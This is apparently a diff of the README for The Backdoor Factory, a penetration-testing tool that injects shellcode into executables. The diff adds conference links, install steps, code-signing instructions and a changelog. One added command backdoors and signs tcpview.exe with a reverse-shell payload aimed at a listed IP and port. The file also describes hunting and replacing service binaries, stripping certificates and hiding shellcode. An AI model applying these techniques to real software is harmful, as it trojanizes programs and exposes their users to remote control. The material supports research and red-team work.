@@ -4,7 +4,35 @@ For security professionals and researchers only.
 
 The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
 
-DerbyCon 2014 Presentation: http://www.youtube.com/watch?v=LjUN9MACaTs
+[![Black Hat Arsenal](https://www.toolswatch.org/badges/arsenal/2015.svg)](https://www.blackhat.com/us-15/arsenal.html)
+
+Black Hat USA 2015:
+
+    Video: https://www.youtube.com/watch?v=OuyLzkG16Uk
+    
+    Paper: https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf
+
+
+Shmoocon 2015:
+    
+    Video: https://archive.org/details/joshpitts_shmoocon2015
+
+    Paper: https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf
+
+
+DerbyCon 2014: 
+
+    Video: http://www.youtube.com/watch?v=LjUN9MACaTs
+
+
+DerbyCon 2013: 
+    
+    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs
+
+    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U
+
+    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory
+
 
 Contact the developer on:
   
@@ -19,23 +47,50 @@ Under a BSD 3 Clause License
 
 See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
 
-Dependences: 
+---
+## Installing
 
-Capstone, using the 'next' repo until it is the 'master' repo: 
-https://github.com/aquynh/capstone/tree/next
+### DOCKER
+```
+docker pull secretsquirrel/the-backdoor-factory
+docker run -it secretsquirrel/the-backdoor-factory bash
+# ./backdoor.py
+```
+
+###OLD SCHOOL
+
+####Dependences
+#####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*
+
+
+[Capstone engine](http://www.capstone-engine.org) can be installed from PyPi with:
+
+    sudo pip install capstone
 
 Pefile, most recent:
-https://code.google.com/p/pefile/
+    
+    https://code.google.com/p/pefile/
 
-INSTALL:
+osslsigncode (included in repo): 
+    
+    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/
 
-./install.sh
+Kali Install:
 
-This will install Capstone with the 'next' repo and use pip to install pefile.
+      apt-get update
+      apt-get install backdoor-factory
+
+
+Other *NIX/MAC INSTALL:
+
+    ./install.sh
+
+This will install Capstone with 3.01 pip to install pefile.
 
 UPDATE:
 
-./update.sh
+    ./update.sh
+
 
 ---
 
@@ -59,95 +114,14 @@ Some executables have built in protections, as such this will not work on all bi
     techniques are based on.
 
 
-From DerbyCon: 
-    
-    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs
-
-    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U
-
-    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory
-
 
 Recently tested on many binaries.
 ---
 
+./backdoor.py -h 
     Usage: backdoor.py [options]
 
-    Options:
-      -h, --help            show this help message and exit
-      -f FILE, --file=FILE  File to backdoor
-      -s SHELL, --shell=SHELL
-                            Payloads that are available for use. Use 'show' to see
-                            payloads.
-      -H HOST, --hostip=HOST
-                            IP of the C2 for reverse connections.
-      -P PORT, --port=PORT  The port to either connect back to for reverse shells
-                            or to listen on for bind shells
-      -J, --cave_jumping    Select this options if you want to use code cave
-                            jumping to further hide your shellcode in the binary.
-      -a, --add_new_section
-                            Mandating that a new section be added to the exe
-                            (better success) but less av avoidance
-      -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
-                            User supplied shellcode, make sure that it matches the
-                            architecture that you are targeting.
-      -c, --cave            The cave flag will find code caves that can be used
-                            for stashing shellcode. This will print to all the
-                            code caves of a specific size.The -l flag can be use
-                            with this setting.
-      -l SHELL_LEN, --shell_length=SHELL_LEN
-                            For use with -c to help find code caves of different
-                            sizes
-      -o OUTPUT, --output-file=OUTPUT
-                            The backdoor output file
-      -n NSECTION, --section=NSECTION
-                            New section name must be less than seven characters
-      -d DIR, --directory=DIR
-                            This is the location of the files that you want to
-                            backdoor. You can make a directory of file backdooring
-                            faster by forcing the attaching of a codecave to the
-                            exe by using the -a setting.
-      -w, --change_access   This flag changes the section that houses the codecave
-                            to RWE. Sometimes this is necessary. Enabled by
-                            default. If disabled, the backdoor may fail.
-      -i, --injector        This command turns the backdoor factory in a hunt and
-                            shellcode inject type of mechinism. Edit the target
-                            settings in the injector module.
-      -u SUFFIX, --suffix=SUFFIX
-                            For use with injector, places a suffix on the original
-                            file for easy recovery
-      -D, --delete_original
-                            For use with injector module.  This command deletes
-                            the original file.  Not for use in production systems.
-                            *Author not responsible for stupid uses.*
-      -O DISK_OFFSET, --disk_offset=DISK_OFFSET
-                            Starting point on disk offset, in bytes. Some authors
-                            want to obfuscate their on disk offset to avoid
-                            reverse engineering, if you find one of those files
-                            use this flag, after you find the offset.
-      -S, --support_check   To determine if the file is supported by BDF prior to
-                            backdooring the file. For use by itself or with
-                            verbose. This check happens automatically if the
-                            backdooring is attempted.
-      -M, --cave-miner      Future use, to help determine smallest shellcode
-                            possible in a PE file
-      -q, --no_banner       Kills the banner.
-      -v, --verbose         For debug information output.
-      -T IMAGE_TYPE, --image-type=IMAGE_TYPE
-                            ALL, x86, or x64 type binaries only. Default=ALL
-      -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
-                            certificate table effectively removing the certificate
-                            from the binary for all intents and purposes.
-      -R, --runas_admin     Checks the PE binaries for 'requestedExecutionLevel
-                            level="highestAvailable"'. If this string is included
-                            in the binary, it must run as system/admin. Doing this
-                            slows patching speed significantly.
-      -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
-                            Patches by default.
-      -F FAT_PRIORITY, --FAT_PRIORITY=FAT_PRIORITY
-                            For MACH-O format. If fat file, focus on which arch to
-                            patch. Default is x64. To force x86 use -F x86, to
-                            force both archs use -F ALL.
+    
 ---
 
 ##Features:
@@ -162,8 +136,11 @@ Recently tested on many binaries.
       -Jump (j), for code cave jumping
       -Single (s), for patching all your shellcode into one cave
       -Append (a), for creating a code cave
-      -Ignore (i), nevermind, ignore this binary
-    Can ignore DLLs.
+      -Ignore (i or q), nevermind, ignore this binary
+    Can ignore DLLs
+    Import Table Patching
+    AutoPatching (-m automtic)
+    Onionduke (-m onionduke)
 
 ###ELF Files
 
@@ -257,7 +234,40 @@ Sample Usage:
     This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.
 
 ---
+###PEcodeSigning
 
+BDF can sign PE files if you have a codesigning cert. It uses osslsigncode.
+Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:
+http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html
+
+Put your private key password in a file (gasp) as so (exactly as so): 
+    
+    echo -n yourpassword > certs/passFile.txt
+
+Name your certs EXACTLY as follows:
+	
+    signingCert.cer => certs/signingCert.cer
+    signingPrivateKey.pem => certs/signingPrivateKey.pem
+
+Your certs/ directory should look excatly as so:
+    
+    certs
+    ├── passFile.txt
+    ├── signingPrivateKey.pem
+    └── signingCert.cer
+
+Enable PE Code Signing with the -C flag as so:
+
+     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
+
+
+On successful run you should see this line in BDF output:
+
+    [*] Code Signing Succeeded
+
+
+
+---
 ###Hunt and backdoor: Injector | Windows Only
     The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
@@ -268,29 +278,159 @@ Sample Usage:
 
 ###Changelog
 
-10/11/2014
+####07/04/2016
+
+* Support for dynamic paths in BDFProxy for preprocessor
+
+####06/19/2016
+
+* Added the preprocessor and other optimizations
+* The preprocessor allows the user to modify the binary prior to payload injection
+* Invoke with the -p flag
+* See samples in ./preprocessor/
+
+
+####12/20/2015
+
+ * Added directory paths to BDF to find certs directory.
+
+
+####12/18/2015
+ * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning
+
+####11/17/2015
+
+ * Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header
+
+####11/13/2015
+  * Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching
+
+####10/19/2015
+  * Fixed bug in IAT directory cave assignment that caused BDF crash
+  * Made the feature optional with -A flag
+
+####10/13/2015
+   * Changed the Import Table Directory modifications from adding a new section to using an existing code cave
+
+
+####08/12/2015
+   * Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary
+   * More for usage with BDFProxy
+
+        Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe
+
+####08/11/2015
+   * Stability fix for auto cave selection for rare caves of overlap
+
+####08/05/2015
+    
+   * BH USA UPDATES, w00t!
+   * OnionDuke, use -m onionduke
+    * Supports user supplied exe's and dll's
+    * Usage: ./backdoor.py -f originalfile.exe -m onionduke -b pentest.dll/exe 
+   * XP MODE = Prior IAT based payloads did not support XP, Wine, or Windows 98.  If you need to support XP use the -X flag. I'm not supporting anything less than XP (and not XP x64).
+   * Invoke UAC prompt to runas as admin. *experimental* - patches the PE manifest if requestedExecutionLevel exists.
+   * Stability updates:
+  	* Fixed a bug with incorrect RVA calculation jmp'ing across 2+ code caves 
+  	* Better checks to determine if a new section for the IAT will write into appended data and therefore fail
+   * Speed Improvements:
+    * Faster code cave finding while using *automatic* mode (-m automatic)
+    * Faster rsrc parsing to find manifest file 
+
+####5/01/2015
+
+   * Bug fix to the reverse_tcp_stager_threaded payload when using single caves payload
+
+####4/28/2015
+
+   * Adding check for Bound Imports (PE files with bound imports will not be patched)
+
+####4/14/2015
+
+So many updates:
+  * Automatic patching for PE files (use -m automatic with a *_threaded payload)
+  
+  * New IAT payloads for x86/x64 PE files
+
+  * Just watch: https://www.youtube.com/watch?v=kkLI_ur6BxY
+
+####2/14/2015
+I <3 you guys
+
+* Added Import Address Table patching for PEs to support iat_reverse_tcp payloads that 
+use the import table for winAPI calls. If the binary you are patching does not
+have LoadLibraryA and GetProcAddress, for example, BDF will patch it in to a 
+new Import Table in a new section. Supports x64/x86 PEs.
+
+* Added iat_reverse_tcp for x64 PEs.
+
+* Bug fixes and improvements
+
+####1/1/2015
+
+Happy New Year!
+
+Two new OS X payloads! The delay: delay_reverse_shell_tcp
+
+-B 30 --> delay the payload for 30 seconds, main code runs right away.
+
+Setting of firm capstone commit for building into BDF, capstone 'Next' repo
+breaks BDF.
+
+Fixes to support cython capstone implementation null byte truncation issue
+
+
+####12/27/2014
+
+Added payloadtests.py
+
+This script will output patched files in backdoored that will allow for the user to 
+test the payloads as they wish. Each payload type increments the port used
+by one.
+
+
+    Usage: payloadtest.py binary HOST PORT
+  
+
+####12/17/2014
+
+OS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp 
+
+-B 15  --> set beacon time for 15 secs
+
+Bug fix to support OS X for BDFProxy
+
+
+
+####10/11/2014
+
 PE UPX Patching Added
 
 
-9/26/2014
+
+####9/26/2014
 
 Mach-O x86/x64 added
 
 x86 IAT payload optimization
 
 
-7/31/2014 
+
+####7/31/2014 
 
 Added support for ARM x32 LE ELF patching
 
-7/22/2014 Changelog
+
+
+####7/22/2014 
 
 Added FreeBSD x32 ELF patching support
 
 Change to BSD 3 Clause License
 
 
-7/13/2014 Changelog
+
+####7/13/2014 
 
 Incorporated Capstone: http://www.capstone-engine.org/
 
@@ -301,7 +441,8 @@ Renamed loadliba_reverse_tcp to iat_reverse_tcp.
 Small optimizations for speed.
 
 
-5/30/2014 Changelog
+
+####5/30/2014 
 
 Added a new win86 shellcode: loadliba_reverse_tcp
     
@@ -312,4 +453,3 @@ Added a new win86 shellcode: loadliba_reverse_tcp
   - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
 
 ---
-
